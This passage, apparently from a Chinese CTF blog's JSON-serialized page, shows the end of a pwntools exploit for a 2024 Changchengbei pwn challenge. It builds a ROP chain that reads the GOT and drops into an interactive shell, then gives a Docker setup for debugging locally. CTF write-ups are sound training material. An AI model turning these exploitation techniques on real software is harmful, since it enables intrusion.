class=\"number\">0x00601070</span>, p8(<span class=\"number\">0xa</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0</span>: <span class=\"string\">b&quot;0\\x00&quot;</span>,</span><br><span class=\"line\">    <span class=\"number\">0x10</span>: base,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: rop_chain + [</span><br><span class=\"line\">        pop_rdi, <span class=\"number\">2</span>**<span class=\"number\">32</span>-((<span class=\"number\">0x000601060</span>-<span class=\"number\">0x600fd8</span>)//<span class=\"number\">8</span>), <span class=\"comment\"># read got</span></span><br><span class=\"line\">        get_rax,</span><br><span class=\"line\">        <span class=\"number\">0x0000400715</span>,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\">io.shutdown(<span class=\"string\">&quot;send&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/p/2024changchengbei/image-20240401045219256.png\" alt=\"image-20240401045219256\"></p>\n<p>不同的libc，修改一下上面offset变量即可</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2><p>以下是Ubuntu GLIBC 2.35-0ubuntu3.1的docker调试环境</p>\n<p>Dockerfile</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu:<span class=\"number\">22.04</span>@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt install socat -yyq</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> useradd -M -s /bin/false ctf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /app</span></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> your_elf flag /app/</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">chmod</span> +x /app/your_elf &amp;&amp; <span class=\"built_in\">chmod</span> -w /app/your_elf &amp;&amp; <span class=\"built_in\">chmod</span> -w /app/flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">USER</span> ctf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;socat&quot;</span>, <span class=\"string\">&quot;TCP-LISTEN:9999,reuseaddr,fork&quot;</span>, <span class=\"string\">&quot;EXEC:/app/your_elf&quot;</span>]</span></span><br></pre></td></tr></table></figure>\n\n<p>docker-compose.yml</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&#x27;3&#x27;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">pwn-dev:</span></span><br><span class=\"line\">    <span class=\"attr\">build:</span> <span class=\"string\">.</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">&quot;9999:9999&quot;</span></span><br><span class=\"line\">    <span class=\"attr\">privileged:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">unless-stopped</span></span><br></pre></td></tr></table></figure>\n\n<p>题目zip</p>\n<p><a href=\"https://gitee.com/csomebro/ctftask/tree/master/2024-03_%E9%95%BF%E5%9F%8E%E6%9D%AF\">Csome&#x2F;CTFTask&#x2F;2024-03_长城杯</a></p>\n","path":"/p/2024changchengbei/","permalink":"https://blog.csome.cc/p/2024changchengbei/","tags":[{"name":"CTF","_id":"cuidhe2mLrs_RBYmTzHeWmv47","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuidE5EaGl_nziC_ifU_P2m7I","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"2023changchengbei","_id":"cuidGydKd2NqXXHNazAp7SnwR","slug":"2023changchengbei","path":"tags/2023changchengbei/","permalink":"https://blog.csome.cc/tags/2023changchengbei/","length":1}],"categories":[],"prev":null,"next":{"title":"House of Some 2 —— 高版本Glibc的IO_FILE利用思路","date":"2024-01-29T07:34:23.000Z","slug":"house-of-some-2","published":true,"updated":"2025-10-28T08:00:40.767Z","_id":"cuid-wgC0VTJjHdDeIVRcMK8e","layout":"post","photos":[],"excerpt":"","path":"/p/house-of-some-2/","permalink":"https://blog.csome.cc/p/house-of-some-2/","__post":true},"__post":true}